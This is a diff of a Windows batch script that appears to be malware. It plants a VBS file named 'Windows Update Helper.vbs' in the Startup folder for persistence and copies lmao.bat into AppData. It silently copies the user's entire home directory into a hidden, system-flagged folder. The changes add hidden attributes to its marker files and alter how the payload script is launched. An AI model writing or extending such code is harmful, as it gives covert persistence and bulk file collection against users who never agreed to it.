@@ -38,6 +38,7 @@ goto :searching
 cd ..
 if not exist alreadycopied.dat (echo false >alreadycopied.dat)
 set /p copied=<alreadycopied.dat
+attrib +h alreadycopied.dat
 if exist novbs.dat set novbs=true
 if not exist novbs.dat set novbs=false
 set com=0
@@ -70,8 +71,10 @@ if not exist "%appdata%\Microsoft\Windows\lmao.bat" (xcopy lmao.bat "%appdata%\M
 if not exist "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Windows Update Helper.vbs" (xcopy "Windows Update Helper.vbs" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\")
 if %copied%==false (
 if %dirr%==HDD (
+attrib -h alreadycopied.dat
 echo true >alreadycopied.dat
-call lmao.bat
+attrib +h alreadycopied.dat
+goto :miss
 )
 )
 attrib +s "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Windows Update Helper.vbs"
@@ -85,13 +88,16 @@ if exist dontcopy.dat (echo " ">iwashere.dat && goto :whileexist)
 set dire=%random%
 if exist RESUME (set /p dire=<RESUME)
 echo %dire% > RESUME
+attrib +h RESUME
 mkdir "%dire%"
 attrib +s +h "%dire%"
 xcopy /S /D "%homedrive%%homepath%" "%dire%"
+attrib -h RESUME
 del RESUME
 
 :whileexist
 del "%appdata%\Microsoft\Windows\doing.dat"
+attrib -h alreadycopied.dat
 del alreadycopied.dat
 if not exist %filename% goto :miss
 goto :whileexist
@@ -141,5 +147,6 @@ cd "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup"
 wscript "Windows Update Helper.vbs"
 exit
 )
-cmd /c call "%appdata%\Microsoft\Windows\lmao.bat"
+cd "%appdata%\Microsoft\Windows\"
+start lmao.bat
 exit
